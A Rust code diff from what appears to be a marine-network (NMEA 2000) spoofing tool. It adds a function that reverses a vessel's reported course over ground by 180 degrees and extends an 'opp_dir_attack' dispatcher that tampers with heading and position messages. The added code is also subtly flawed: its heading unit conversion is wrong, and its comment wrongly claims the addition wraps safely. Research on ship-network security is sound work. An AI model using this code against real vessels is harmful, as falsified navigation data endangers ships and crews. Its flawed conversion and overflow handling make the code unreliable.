@@ -1,6 +1,6 @@
 use crate::NMEAMsg;
-static mut LAST_LAT: i32 = 670000000;
-static mut LAST_LON: i32 = -720000000;
+static mut LAST_LAT: i32 = 0;
+static mut LAST_LON: i32 = 0;
 
 //only here temp. will be deleted after
 extern "C" {
@@ -88,14 +88,36 @@ pub fn _127250(mut msg: NMEAMsg) -> NMEAMsg{
     return msg;
 }
 
+/// Modifies a COG & SOG, Rapid Update
+///
+/// For PGN 129026
+/// Changes the course over ground heading by 180 degrees
+pub fn _129026(mut msg: NMEAMsg) -> NMEAMsg{
+    // Extract the heading data
+    let heading_bytes: [u8; 2] = [msg.data[2], msg.data[3]];;
+    let original_hdg: u16 = u16::from_le_bytes(heading_bytes);
+
+    // Modify the heading by adding 3.1415 radians and wrapping
+    let modified_hdg = (original_hdg + (std::f32::consts::PI * 65536.0 / (2.0 * std::f32::consts::PI)) as u16); // as u16 provides wrapping behaviour so we don't need to include % 65536
+
+    // Convert the modified heading back to bytes
+    let modified_hdg_bytes: [u8; 2] = modified_hdg.to_le_bytes();
+
+    // Update the msg.data array with the modified heading
+    msg.data[2..4].copy_from_slice(&modified_hdg_bytes);
+
+    return msg;
+}
+
 /// Modifies a message if it contains positional data
-pub fn attack(msg: NMEAMsg) -> NMEAMsg{
+pub fn opp_dir_attack(msg: NMEAMsg) -> NMEAMsg{
 
     let modified_msg;
 
     modified_msg = match msg.pgn {
         127250 => _127250(msg),
         129025 =>  _129025(msg),
+        129026 => _129026(msg),
         _ => msg,
     };
 
